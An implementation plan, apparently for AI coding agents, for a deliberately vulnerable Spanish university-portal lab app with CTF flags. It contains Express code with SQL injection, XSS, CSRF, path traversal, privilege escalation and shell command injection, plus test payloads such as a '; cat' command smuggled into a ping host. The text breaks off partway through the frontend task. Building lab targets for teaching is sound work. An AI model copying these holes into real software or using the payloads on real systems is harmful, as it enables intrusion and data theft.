# Lab Vulnerabilidades Web — Portal Universitario: Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Construir una aplicación web intencionalmente vulnerable con temática de portal universitario, que contenga 7 vulnerabilidades OWASP con flags CTF estáticas, para uso educativo en un curso de seguridad.

**Architecture:** Un solo proceso Express sirve el frontend estático (`public/`) y todas las rutas API. SQLite almacena usuarios, mensajes y una tabla de flags. Todas las vulnerabilidades están activas simultáneamente.

**Tech Stack:** Node.js 18+, Express 4, better-sqlite3, express-session, md5, supertest (dev)

---

## Mapa de archivos

| Archivo | Responsabilidad |
|---|---|
| `package.json` | Dependencias y scripts |
| `db.js` | Init SQLite, seed de usuarios/mensajes/flags |
| `server.js` | App Express: todas las rutas, FLAGS object |
| `public/index.html` | Formulario de login |
| `public/dashboard.html` | Panel alumno: búsqueda, mensajes, descargas, perfil |
| `public/docente.html` | Panel docente: calificaciones y mensajes |
| `public/admin.html` | Panel admin: contiene comentario HTML con credenciales + ping tool |
| `public/css/style.css` | Estilos básicos del portal |
| `public/js/app.js` | Helpers JS para llamadas AJAX |
| `public/materiales/temario_u1.txt` | Material de clase (descarga normal) |
| `public/materiales/guia_lab.txt` | Material de clase (descarga normal) |
| `secret_lfi.txt` | Flag de file inclusion (accesible vía path traversal) |
| `tests/lab.test.js` | Pruebas de funcionalidad y explotabilidad de cada vuln |
| `README.md` | Guía de instalación y uso para alumnos |
| `docs/guia-docente.md` | Payloads, pasos de explotación y criterios de evaluación |

---

## Task 1: Inicializar proyecto

**Files:**
- Create: `package.json`
- Create: `uploads/.gitkeep`
- Create: `public/materiales/.gitkeep`

- [ ] **Step 1: Crear `package.json`**

```json
{
  "name": "portal-universitario-vulnerable",
  "version": "1.0.0",
  "description": "INTENCIONALMENTE VULNERABLE — solo para uso educativo en ambiente controlado",
  "main": "server.js",
  "scripts": {
    "start": "node server.js",
    "test": "node --test tests/"
  },
  "dependencies": {
    "express": "^4.18.2",
    "express-session": "^1.17.3",
    "better-sqlite3": "^9.4.3",
    "md5": "^2.3.0"
  },
  "devDependencies": {
    "supertest": "^6.3.4"
  }
}
```

- [ ] **Step 2: Instalar dependencias**

```bash
npm install
```

Salida esperada: `added N packages` sin errores.

- [ ] **Step 3: Crear directorios necesarios**

```bash
mkdir -p uploads public/materiales public/css public/js tests
touch uploads/.gitkeep public/materiales/.gitkeep
```

- [ ] **Step 4: Crear archivos de material de clase**

`public/materiales/temario_u1.txt`:
```
TEMARIO UNIDAD 1 — Introducción a Seguridad Web
================================================
1. Conceptos básicos de HTTP
2. Autenticación y sesiones
3. OWASP Top 10
4. Herramientas de análisis: Burp Suite, OWASP ZAP, Nikto
```

`public/materiales/guia_lab.txt`:
```
GUÍA DE LABORATORIO — Portal Universitario
==========================================
Instrucciones para el análisis de vulnerabilidades.
Herramientas: OWASP ZAP, Nikto, Burp Suite.
```

- [ ] **Step 5: Commit**

```bash
git add package.json package-lock.json uploads/.gitkeep public/materiales/ public/materiales/temario_u1.txt public/materiales/guia_lab.txt
git commit -m "chore: init project structure and dependencies"
```

---

## Task 2: Base de datos (db.js)

**Files:**
- Create: `db.js`

- [ ] **Step 1: Escribir test que verifique el seed inicial**

`tests/lab.test.js`:
```javascript
'use strict';
const { test, describe, before, after } = require('node:test');
const assert = require('node:assert');
const request = require('supertest');
const { resetDb } = require('../db');

// Resetear la DB antes de cada ejecución para que los tests sean idempotentes
let app;
before(() => {
  resetDb();
  app = require('../server');
});

describe('Database seed', () => {
  test('usuarios seed cargado correctamente', async () => {
    const res = await request(app)
      .get('/api/users');
    assert.equal(res.status, 200);
    const usernames = res.body.users.map(u => u.username);
    assert.ok(usernames.includes('admin'));
    assert.ok(usernames.includes('prof_garcia'));
    assert.ok(usernames.includes('alumno_lopez'));
    assert.ok(usernames.includes('alumno_perez'));
  });
});
```

- [ ] **Step 2: Ejecutar test para verificar que falla**

```bash
node --test tests/
```

Salida esperada: falla con `Cannot find module '../server'`

- [ ] **Step 3: Crear `db.js`**

```javascript
'use strict';
const Database = require('better-sqlite3');
const md5 = require('md5');
const path = require('path');

const DB_PATH = path.join(__dirname, 'db.sqlite');

function initDb() {
  const db = new Database(DB_PATH);

  db.exec(`
    CREATE TABLE IF NOT EXISTS usuarios (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      password TEXT NOT NULL,
      email TEXT,
      rol TEXT NOT NULL DEFAULT 'alumno',
      nombre TEXT
    );
    CREATE TABLE IF NOT EXISTS mensajes (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      autor TEXT NOT NULL,
      contenido TEXT NOT NULL,
      fecha DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS materiales (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      nombre TEXT NOT NULL,
      archivo TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS flags (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      vuln TEXT UNIQUE NOT NULL,
      flag TEXT NOT NULL
    );
  `);

  const insertUser = db.prepare(
    'INSERT OR IGNORE INTO usuarios (username, password, email, rol, nombre) VALUES (@username, @password, @email, @rol, @nombre)'
  );
  [
    { username: 'admin',        password: md5('admin123'),   email: 'admin@universidad.edu',       rol: 'admin',   nombre: 'Administrador'  },
    { username: 'prof_garcia',  password: md5('docente123'), email: 'garcia@universidad.edu',      rol: 'docente', nombre: 'Prof. García'   },
    { username: 'alumno_lopez', password: md5('alumno123'),  email: 'lopez@universidad.edu',       rol: 'alumno',  nombre: 'Carlos López'   },
    { username: 'alumno_perez', password: md5('alumno456'),  email: 'perez@universidad.edu',       rol: 'alumno',  nombre: 'Ana Pérez'      },
  ].forEach(u => insertUser.run(u));

  const insertMsg = db.prepare('INSERT OR IGNORE INTO mensajes (autor, contenido) VALUES (?, ?)');
  insertMsg.run('admin', 'Bienvenidos al portal universitario del semestre 2026-1.');
  insertMsg.run('prof_garcia', 'El examen parcial queda programado para el viernes.');

  db.prepare('INSERT OR IGNORE INTO materiales (nombre, archivo) VALUES (?, ?)').run('Temario Unidad 1', 'temario_u1.txt');
  db.prepare('INSERT OR IGNORE INTO materiales (nombre, archivo) VALUES (?, ?)').run('Guía de Laboratorio', 'guia_lab.txt');

  // La flag de SQLi vive en esta tabla; se obtiene con UNION SELECT
  db.prepare('INSERT OR IGNORE INTO flags (vuln, flag) VALUES (?, ?)').run('sqli', 'FLAG{sql_1nj3ct10n}');

  return db;
}

function resetDb() {
  const fs = require('fs');
  if (fs.existsSync(DB_PATH)) fs.unlinkSync(DB_PATH);
  return initDb();
}

module.exports = { initDb, resetDb, DB_PATH };
```

---

## Task 3: Servidor base (server.js — estructura, sesión, estáticos, FLAGS)

**Files:**
- Create: `server.js`
- Create: `secret_lfi.txt`

- [ ] **Step 1: Crear `secret_lfi.txt`** (flag de file inclusion en la raíz del proyecto)

```
FLAG{f1l3_1nclus10n}
```

- [ ] **Step 2: Crear esqueleto de `server.js`**

```javascript
'use strict';

const express    = require('express');
const session    = require('express-session');
const path       = require('path');
const fs         = require('fs');
const { exec }   = require('child_process');
const md5        = require('md5');
const { initDb, DB_PATH } = require('./db');

const app = express();
const db  = initDb();

// Flags estáticas — cada una se revela al explotar la vuln correspondiente
const FLAGS = {
  sqli:      'FLAG{sql_1nj3ct10n}',
  cmdi:      'FLAG{cmd_1nj3ct10n}',
  xss:       'FLAG{xss_st0r3d}',
  csrf:      'FLAG{csrf_4tt4ck}',
  lfi:       'FLAG{f1l3_1nclus10n}',
  sensitive: 'FLAG{s3ns1t1v3_d4t4}',
  privesc:   'FLAG{pr1v_3sc4l4t10n}',
};

// Crear flag_cmd.txt en disco (la flag de cmd injection se lee con ; cat flag_cmd.txt)
fs.writeFileSync(path.join(__dirname, 'flag_cmd.txt'), FLAGS.cmdi + '\n');

// ── Middleware ────────────────────────────────────────────────
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Sesión INTENCIONALMENTE insegura
app.use(session({
  secret: 'supersecretkey123',
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: false,  // cookie accesible desde JS (permite robo via XSS)
    secure:   false,
    sameSite: false,  // permite CSRF cross-origin
  },
}));

// db.sqlite servido como archivo estático (exposición de datos sensibles)
app.get('/db.sqlite', (req, res) => res.download(DB_PATH));

// Archivos estáticos del frontend
app.use(express.static(path.join(__dirname, 'public')));

// ── Rutas (se añaden en tareas posteriores) ───────────────────

// Iniciar servidor solo cuando se ejecuta directamente
if (require.main === module) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log('\n╔══════════════════════════════════════════════════╗');
    console.log('║  PORTAL UNIVERSITARIO — LABORATORIO VULNERABLE   ║');
    console.log('╚══════════════════════════════════════════════════╝');
    console.log(`\n  URL: http://localhost:${PORT}`);
    console.log('  ADVERTENCIA: Esta app es INTENCIONALMENTE VULNERABLE');
    console.log('  Usar SOLO en ambiente local de laboratorio.\n');
  });
}

module.exports = app;
```

- [ ] **Step 3: Verificar que el servidor arranca**

```bash
node server.js &
curl -s http://localhost:3000/ | head -5
kill %1
```

Salida esperada: primeras líneas del HTML de `public/index.html` (aunque aún no existe, el servidor debe responder).

- [ ] **Step 4: Ejecutar tests (deben pasar el de seed ahora)**

```bash
node --test tests/
```

Salida esperada: el test `Database seed > usuarios seed cargado correctamente` pasa (falla porque /api/users no existe aún — OK, se implementa en Task 6).

- [ ] **Step 5: Commit**

```bash
git add server.js db.js secret_lfi.txt
git commit -m "feat: add Express server skeleton, db init, session config"
```

---

## Task 4: Login y logout — VULN SQLi

**Files:**
- Modify: `server.js` (añadir rutas POST /login, GET /logout)
- Modify: `tests/lab.test.js`

- [ ] **Step 1: Añadir tests de autenticación y SQLi**

Añadir al final de `tests/lab.test.js`:
```javascript
describe('Autenticación', () => {
  test('Login con credenciales válidas retorna rol y nombre', async () => {
    const res = await request(app)
      .post('/login')
      .send({ username: 'alumno_lopez', password: 'alumno123' });
    assert.equal(res.status, 200);
    assert.equal(res.body.rol, 'alumno');
    assert.ok(res.body.nombre);
  });

  test('Login con contraseña incorrecta retorna 401', async () => {
    const res = await request(app)
      .post('/login')
      .send({ username: 'alumno_lopez', password: 'wrong' });
    assert.equal(res.status, 401);
  });
});

describe('VULN 1 — SQL Injection en login', () => {
  test("Payload ' OR '1'='1' -- hace bypass y revela FLAG{sql_1nj3ct10n}", async () => {
    const res = await request(app)
      .post('/login')
      .send({ username: "' OR '1'='1' --", password: 'irrelevante' });
    assert.equal(res.status, 200);
    assert.equal(res.body.flag, 'FLAG{sql_1nj3ct10n}');
    assert.ok(res.body.debug, 'Debe incluir la query ejecutada');
  });
});
```

- [ ] **Step 2: Ejecutar tests — deben fallar**

```bash
node --test tests/
```

Salida esperada: `ERR_CONNECTION_REFUSED` o 404 en los nuevos tests.

- [ ] **Step 3: Añadir rutas de auth en `server.js`** (antes de `module.exports`)

```javascript
// ── POST /login — VULNERABLE: SQL Injection ──────────────────
app.post('/login', (req, res) => {
  const { username = '', password = '' } = req.body;
  const hash = md5(password);

  // VULNERABLE: concatenación directa sin parámetros preparados
  const query = `SELECT * FROM usuarios WHERE username = '${username}' AND password = '${hash}'`;

  let user;
  try {
    user = db.prepare(query).get();
  } catch (e) {
    // Fuga de detalle de error (información sensible)
    return res.status(400).json({ error: e.message, query });
  }

  if (!user) return res.status(401).json({ error: 'Credenciales inválidas' });

  req.session.user = { id: user.id, username: user.username, rol: user.rol, nombre: user.nombre };

  const response = { ok: true, rol: user.rol, nombre: user.nombre };

  // Si el payload contiene metacaracteres SQL, la flag se revela
  if (username.includes("'") || username.includes('--') || username.toLowerCase().includes(' or ')) {
    response.flag  = FLAGS.sqli;
    response.debug = `Query ejecutada: ${query}`;
  }

  return res.json(response);
});

// ── GET /logout ───────────────────────────────────────────────
app.get('/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/');
});
```

- [ ] **Step 4: Ejecutar tests — deben pasar**

```bash
node --test tests/
```

Salida esperada: los 3 tests de `Autenticación` y `VULN 1` pasan.

- [ ] **Step 5: Commit**

```bash
git add server.js tests/lab.test.js
git commit -m "feat: add login/logout with SQLi vulnerability (VULN 1)"
```

---

## Task 5: Búsqueda de alumnos — VULN SQLi (UNION)

**Files:**
- Modify: `server.js`
- Modify: `tests/lab.test.js`

- [ ] **Step 1: Añadir test de búsqueda y SQLi UNION**

```javascript
describe('VULN 1b — SQL Injection en /search (UNION SELECT)', () => {
  let cookie;
  before(async () => {
    const res = await request(app).post('/login').send({ username: 'alumno_lopez', password: 'alumno123' });
    cookie = res.headers['set-cookie'];
  });

  test('Búsqueda normal retorna usuarios', async () => {
    const res = await request(app).get('/search?q=Lopez').set('Cookie', cookie);
    assert.equal(res.status, 200);
    assert.ok(Array.isArray(res.body.results));
    assert.ok(res.body.results.length > 0);
  });

  test('UNION SELECT extrae tabla flags y muestra FLAG{sql_1nj3ct10n}', async () => {
    const payload = encodeURIComponent("' UNION SELECT id, flag, flag, flag, flag FROM flags --");
    const res = await request(app).get(`/search?q=${payload}`).set('Cookie', cookie);
    assert.equal(res.status, 200);
    const valores = res.body.results.flatMap(r => Object.values(r));
    assert.ok(valores.some(v => String(v).includes('FLAG{')), 'La flag debe aparecer en los resultados');
  });

  test('/search sin sesión retorna 401', async () => {
    const res = await request(app).get('/search?q=test');
    assert.equal(res.status, 401);
  });
});
```

- [ ] **Step 2: Ejecutar tests — deben fallar**

```bash
node --test tests/
```

- [ ] **Step 3: Añadir ruta GET /search en `server.js`**

```javascript
// ── GET /search — VULNERABLE: SQL Injection (UNION) ──────────
app.get('/search', (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'No autenticado' });

  const q = req.query.q || '';
  // VULNERABLE: concatenación directa
  const query = `SELECT id, username, nombre, email, rol FROM usuarios WHERE nombre LIKE '%${q}%' OR username LIKE '%${q}%'`;

  let results;
  try {
    results = db.prepare(query).all();
  } catch (e) {
    return res.status(400).json({ error: e.message, query });
  }

  return res.json({ results, query });
});
```

- [ ] **Step 4: Ejecutar tests — deben pasar**

```bash
node --test tests/
```

- [ ] **Step 5: Commit**

```bash
git add server.js tests/lab.test.js
git commit -m "feat: add /search with SQLi UNION vulnerability (VULN 1b)"
```

---

## Task 6: Exposición de datos sensibles — VULN 6

**Files:**
- Modify: `server.js`
- Modify: `tests/lab.test.js`

- [ ] **Step 1: Añadir tests**

```javascript
describe('VULN 6 — Exposición de datos sensibles', () => {
  test('/api/users retorna usuarios con hashes sin requerir autenticación', async () => {
    const res = await request(app).get('/api/users');
    assert.equal(res.status, 200);
    assert.ok(Array.isArray(res.body.users));
    assert.ok(res.body.users.every(u => u.password), 'Los hashes deben estar expuestos');
    assert.equal(res.body.flag, 'FLAG{s3ns1t1v3_d4t4}');
  });

  test('/db.sqlite es descargable sin autenticación', async () => {
    const res = await request(app).get('/db.sqlite');
    assert.ok(res.status === 200 || res.status === 304);
  });
});
```

- [ ] **Step 2: Ejecutar tests — deben fallar**

```bash
node --test tests/
```

- [ ] **Step 3: Añadir ruta GET /api/users en `server.js`**

```javascript
// ── GET /api/users — VULNERABLE: sin autenticación, expone hashes ──
app.get('/api/users', (req, res) => {
  // VULNERABLE: no requiere sesión, retorna campos sensibles incluyendo password hash
  const users = db.prepare('SELECT id, username, email, rol, password FROM usuarios').all();
  return res.json({ users, flag: FLAGS.sensitive });
});
```

- [ ] **Step 4: Ejecutar tests — deben pasar**

```bash
node --test tests/
```

- [ ] **Step 5: Commit**

```bash
git add server.js tests/lab.test.js
git commit -m "feat: add /api/users without auth and db.sqlite exposure (VULN 6)"
```

---

## Task 7: Mensajes — VULN XSS (Stored + Reflected)

**Files:**
- Modify: `server.js`
- Modify: `tests/lab.test.js`

- [ ] **Step 1: Añadir tests**

```javascript
describe('VULN 3 — XSS Stored y Reflected', () => {
  let cookie;
  before(async () => {
    const res = await request(app).post('/login').send({ username: 'alumno_lopez', password: 'alumno123' });
    cookie = res.headers['set-cookie'];
  });

  test('POST /messages guarda contenido sin sanitizar (XSS Stored)', async () => {
    const payload = '<script>alert("xss")</script>';
    const post = await request(app).post('/messages').set('Cookie', cookie).send({ contenido: payload });
    assert.equal(post.status, 200);

    const get = await request(app).get('/messages').set('Cookie', cookie);
    assert.ok(get.text.includes(payload), 'El payload XSS debe aparecer sin escapar en la respuesta HTML');
  });

  test('GET /messages?msg= refleja parámetro sin sanitizar (XSS Reflected)', async () => {
    const payload = '<script>alert(1)</script>';
    const res = await request(app)
      .get(`/messages?msg=${encodeURIComponent(payload)}`)
      .set('Cookie', cookie);
    assert.ok(res.text.includes(payload), 'El parámetro msg debe reflejarse sin escapar');
  });

  test('GET /api/xss-flag retorna FLAG{xss_st0r3d} con sesión activa', async () => {
    const res = await request(app).get('/api/xss-flag').set('Cookie', cookie);
    assert.equal(res.status, 200);
    assert.equal(res.body.flag, 'FLAG{xss_st0r3d}');
  });
});
```

- [ ] **Step 2: Ejecutar tests — deben fallar**

```bash
node --test tests/
```

- [ ] **Step 3: Añadir rutas de mensajes en `server.js`**

```javascript
// ── GET /messages — VULNERABLE: XSS Reflected (?msg=) ────────
app.get('/messages', (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'No autenticado' });

  const msg = req.query.msg || '';
  const messages = db.prepare('SELECT * FROM mensajes ORDER BY fecha DESC').all();

  // VULNERABLE: msg y contenidos se insertan en HTML sin escapar
  res.send(`<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Mensajes — Portal Universitario</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <nav><a href="/dashboard.html">← Volver</a> | <a href="/logout">Cerrar sesión</a></nav>
  <h1>Tablero de mensajes</h1>
  ${msg ? `<div class="notif">Notificación: ${msg}</div>` : ''}
  <ul class="messages">
    ${messages.map(m => `<li><strong>${m.autor}</strong> <span class="date">${m.fecha}</span><br>${m.contenido}</li>`).join('')}
  </ul>
  <form id="msgForm">
    <textarea name="contenido" placeholder="Escribe un mensaje..." rows="3"></textarea>
    <button type="submit">Enviar</button>
  </form>
  <script>
    document.getElementById('msgForm').addEventListener('submit', async e => {
      e.preventDefault();
      const body = new URLSearchParams(new FormData(e.target));
      await fetch('/messages', { method: 'POST', body });
      location.reload();
    });
  </script>
</body>
</html>`);
});

// ── POST /messages — VULNERABLE: XSS Stored ──────────────────
app.post('/messages', (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'No autenticado' });

  const { contenido = '' } = req.body;
  // VULNERABLE: se guarda sin sanitizar
  db.prepare('INSERT INTO mensajes (autor, contenido) VALUES (?, ?)').run(req.session.user.username, contenido);
  return res.json({ ok: true });
});

// ── GET /api/xss-flag — la llama el payload XSS para obtener la flag ──
app.get('/api/xss-flag', (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'No autenticado' });
  return res.json({ flag: FLAGS.xss });
});
```

- [ ] **Step 4: Ejecutar tests — deben pasar**

```bash
node --test tests/
```

- [ ] **Step 5: Commit**

```bash
git add server.js tests/lab.test.js
git commit -m "feat: add messages with XSS stored and reflected vulnerabilities (VULN 3)"
```

---

## Task 8: Actualización de perfil — VULN CSRF + Escalación de privilegios

**Files:**
- Modify: `server.js`
- Modify: `tests/lab.test.js`

- [ ] **Step 1: Añadir tests**

```javascript
describe('VULN 4 — CSRF en cambio de contraseña', () => {
  let cookie;
  before(async () => {
    const res = await request(app).post('/login').send({ username: 'alumno_perez', password: 'alumno456' });
    cookie = res.headers['set-cookie'];
  });

  test('POST /profile/update acepta cambio de contraseña sin token CSRF y retorna flag', async () => {
    const res = await request(app)
      .post('/profile/update')
      .set('Cookie', cookie)
      .send({ password: 'nueva123' });
    assert.equal(res.status, 200);
    assert.equal(res.body.csrf_flag, 'FLAG{csrf_4tt4ck}');
  });
});

describe('VULN 7 — Escalación de privilegios vertical', () => {
  let cookie;
  before(async () => {
    // Usar alumno_lopez (contraseña nunca modificada por otros tests)
    const res = await request(app).post('/login').send({ username: 'alumno_lopez', password: 'alumno123' });
    cookie = res.headers['set-cookie'];
  });

  test('Alumno puede cambiar su propio rol a admin enviando rol=admin', async () => {
    const res = await request(app)
      .post('/profile/update')
      .set('Cookie', cookie)
      .send({ rol: 'admin' });
    assert.equal(res.status, 200);
    assert.equal(res.body.flag, 'FLAG{pr1v_3sc4l4t10n}');
  });
});
```

- [ ] **Step 2: Ejecutar tests — deben fallar**

```bash
node --test tests/
```

- [ ] **Step 3: Añadir ruta POST /profile/update en `server.js`**

```javascript
// ── POST /profile/update — VULNERABLE: CSRF + Escalación de privilegios ──
app.post('/profile/update', (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'No autenticado' });

  const { password, rol } = req.body;
  // VULNERABLE: no valida CSRF token
  // VULNERABLE: acepta campo `rol` desde el cliente sin verificar rol actual

  const updates = {};
  if (password) updates.password = md5(password);
  if (rol)      updates.rol = rol;

  if (Object.keys(updates).length === 0) {
    return res.json({ ok: false, message: 'Sin cambios' });
  }

  const sets   = Object.keys(updates).map(k => `${k} = ?`).join(', ');
  const values = [...Object.values(updates), req.session.user.id];
  db.prepare(`UPDATE usuarios SET ${sets} WHERE id = ?`).run(...values);

  const response = { ok: true, message: 'Perfil actualizado' };

  if (rol && rol !== req.session.user.rol) {
    response.flag = FLAGS.privesc;
    req.session.user.rol = rol;
  }
  if (password) {
    response.csrf_flag = FLAGS.csrf;
  }

  return res.json(response);
});
```

- [ ] **Step 4: Ejecutar tests — deben pasar**

```bash
node --test tests/
```

- [ ] **Step 5: Commit**

```bash
git add server.js tests/lab.test.js
git commit -m "feat: add profile update with CSRF and privilege escalation (VULN 4 & 7)"
```

---

## Task 9: Descarga de archivos — VULN File Inclusion / Path Traversal

**Files:**
- Modify: `server.js`
- Modify: `tests/lab.test.js`

- [ ] **Step 1: Añadir tests**

```javascript
describe('VULN 5 — File Inclusion / Path Traversal', () => {
  let cookie;
  before(async () => {
    const res = await request(app).post('/login').send({ username: 'alumno_lopez', password: 'alumno123' });
    cookie = res.headers['set-cookie'];
  });

  test('Descarga normal de material funciona', async () => {
    const res = await request(app).get('/download?file=temario_u1.txt').set('Cookie', cookie);
    assert.equal(res.status, 200);
    assert.ok(res.body.content.includes('TEMARIO'));
  });

  test('Path traversal ../../secret_lfi.txt revela FLAG{f1l3_1nclus10n}', async () => {
    const payload = encodeURIComponent('../../secret_lfi.txt');
    const res = await request(app).get(`/download?file=${payload}`).set('Cookie', cookie);
    assert.equal(res.status, 200);
    assert.equal(res.body.flag, 'FLAG{f1l3_1nclus10n}');
    assert.ok(res.body.content.includes('FLAG{f1l3_1nclus10n}'));
  });
});
```

- [ ] **Step 2: Ejecutar tests — deben fallar**

```bash
node --test tests/
```

- [ ] **Step 3: Añadir ruta GET /download en `server.js`**

```javascript
// ── GET /download — VULNERABLE: Path Traversal ───────────────
app.get('/download', (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'No autenticado' });

  const file = req.query.file || '';
  // VULNERABLE: path.join sin validar que el resultado esté dentro de materiales/
  const filePath = path.join(__dirname, 'public', 'materiales', file);

  try {
    const content = fs.readFileSync(filePath, 'utf8');
    const response = { file, filePath, content };
    if (file.includes('..')) response.flag = FLAGS.lfi;
    return res.json(response);
  } catch (e) {
    return res.status(404).json({ error: 'Archivo no encontrado', filePath, message: e.message });
  }
});
```

- [ ] **Step 4: Ejecutar tests — deben pasar**

```bash
node --test tests/
```

- [ ] **Step 5: Commit**

```bash
git add server.js tests/lab.test.js
git commit -m "feat: add /download with path traversal vulnerability (VULN 5)"
```

---

## Task 10: Admin ping — VULN Command Injection

**Files:**
- Modify: `server.js`
- Modify: `tests/lab.test.js`

- [ ] **Step 1: Añadir tests**

```javascript
describe('VULN 2 — Command Injection en /admin/ping', () => {
  let cookie;
  before(async () => {
    // Cualquier usuario autenticado puede acceder (insufficient access control)
    const res = await request(app).post('/login').send({ username: 'alumno_lopez', password: 'alumno123' });
    cookie = res.headers['set-cookie'];
  });

  test('Ping normal a localhost retorna output', async () => {
    const res = await request(app).get('/admin/ping?host=localhost').set('Cookie', cookie);
    assert.equal(res.status, 200);
    assert.ok(res.body.output);
  });

  test('Payload con ; cat flag_cmd.txt revela FLAG{cmd_1nj3ct10n}', (_, done) => {
    const payload = encodeURIComponent('localhost; cat flag_cmd.txt');
    request(app)
      .get(`/admin/ping?host=${payload}`)
      .set('Cookie', cookie)
      .then(res => {
        assert.equal(res.status, 200);
        assert.ok(res.body.output.includes('FLAG{cmd_1nj3ct10n}'), `Output fue: ${res.body.output}`);
        done();
      })
      .catch(done);
  });

  test('/admin/ping sin sesión retorna 401', async () => {
    const res = await request(app).get('/admin/ping?host=localhost');
    assert.equal(res.status, 401);
  });
});
```

- [ ] **Step 2: Ejecutar tests — deben fallar**

```bash
node --test tests/
```

- [ ] **Step 3: Añadir rutas de admin en `server.js`**

```javascript
// ── GET /admin/ping — VULNERABLE: Command Injection ──────────
// También vulnerable a insuficiente control de acceso: cualquier usuario autenticado puede usarla
app.get('/admin/ping', (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'No autenticado' });
  // VULNERABLE: no verifica que req.session.user.rol === 'admin'

  const host = req.query.host || 'localhost';
  // VULNERABLE: exec sin sanitización de metacaracteres de shell
  exec(`ping -c 1 ${host}`, { timeout: 5000 }, (error, stdout, stderr) => {
    res.json({
      command: `ping -c 1 ${host}`,
      output:  stdout || stderr || (error ? error.message : ''),
    });
  });
});

// ── GET /admin/panel — Panel de administración ────────────────
app.get('/admin/panel', (req, res) => {
  if (!req.session.user || req.session.user.rol !== 'admin') {
    return res.redirect('/?error=acceso_denegado');
  }
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});
```

- [ ] **Step 4: Ejecutar tests — deben pasar**

```bash
node --test tests/
```

Nota: el test de `; cat flag_cmd.txt` requiere que `ping` esté disponible en el sistema.

- [ ] **Step 5: Commit**

```bash
git add server.js tests/lab.test.js
git commit -m "feat: add /admin/ping with command injection vulnerability (VULN 2)"
```

---

## Task 11: Frontend HTML/CSS/JS

**Files:**
- Create: `public/css/style.css`
- Create: `public/js/app.js`
- Create: `public/index.html`
- Create: `public/dashboard.html`
- Create: `public/docente.html`
- Create: `public/admin.html`

- [ ] **Step 1: Crear `public/css/style.css`**

```css
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: Arial, sans-serif; background: #f0f2f5; color: #333; }
nav { background: #1a237e; color: #fff; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; }
nav a { color: #fff; text-decoration: none; margin-left: 15px; }
nav a:hover { text-decoration: underline; }
.container { max-width: 900px; margin: 30px auto; padding: 0 20px; }
.card { background: #fff; border-radius: 8px; padding: 25px; margin-bottom: 20px; box-shadow: 0 2px 6px rgba(0,0,0,.1); }
h1 { color: #1a237e; margin-bottom: 15px; }
h2 { color: #283593; margin-bottom: 12px; font-size: 1.2rem; }
input, textarea, select { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 10px; font-size: 14px; }
button { background: #1a237e; color: #fff; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 14px; }
button:hover { background: #283593; }
.error { color: #c62828; margin-top: 8px; }
.success { color: #2e7d32; margin-top: 8px; }
.notif { background: #fff9c4; border-left: 4px solid #f9a825; padding: 10px 15px; margin-bottom: 15px; border-radius: 4px; }
.messages li { list-style: none; padding: 10px 0; border-bottom: 1px solid #eee; }
.messages .date { font-size: 12px; color: #888; margin-left: 8px; }
table { width: 100%; border-collapse: collapse; }
th, td { text-align: left; padding: 10px; border-bottom: 1px solid #eee; }
th { background: #e8eaf6; color: #1a237e; }
.badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 12px; font-weight: bold; }
.badge-admin   { background: #ffcdd2; color: #b71c1c; }
.badge-docente { background: #c8e6c9; color: #1b5e20; }
.badge-alumno  { background: #bbdefb; color: #0d47a1; }
.flag-box { background: #1b1b1b; color: #00e676; font-family: monospace; padding: 12px 16px; border-radius: 6px; margin-top: 10px; font-size: 14px; }
```

- [ ] **Step 2: Crear `public/js/app.js`**

```javascript
// Obtener sesión actual
async function getSession() {
  const res = await fetch('/api/session');
  if (!res.ok) { window.location = '/'; return null; }
  return res.json();
}

// Llamada genérica a la API
async function api(method, url, body) {
  const opts = { method, headers: { 'Content-Type': 'application/json' } };
  if (body) opts.body = JSON.stringify(body);
  const res = await fetch(url, opts);
  return res.json();
}

function showFlag(flag, containerId) {
  const el = document.getElementById(containerId);
  if (el && flag) {
    el.innerHTML = `<div class="flag-box">🚩 ${flag}</div>`;
  }
}
```

- [ ] **Step 3: Añadir ruta GET /api/session en `server.js`** (antes de `module.exports`)

```javascript
// ── GET /api/session — info del usuario actual ────────────────
app.get('/api/session', (req, res) => {
  if (!req.session.user) return res.status(401).json({ error: 'No autenticado' });
  return res.json(req.session.user);
});
```

- [ ] **Step 4: Crear `public/index.html`**

```html
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Portal Universitario — Inicio de sesión</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <nav>
    <span>🏛️ Universidad Autónoma</span>
  </nav>
  <div class="container">
    <div class="card" style="max-width:400px;margin:60px auto;">
      <h1>Iniciar sesión</h1>
      <form id="loginForm">
        <input type="text"     name="username" placeholder="Usuario"     required>
        <input type="password" name="password" placeholder="Contraseña" required>
        <button type="submit">Entrar</button>
        <p id="msg" class="error"></p>
      </form>
    </div>
  </div>
  <script>
    // Verificar si ya hay sesión activa
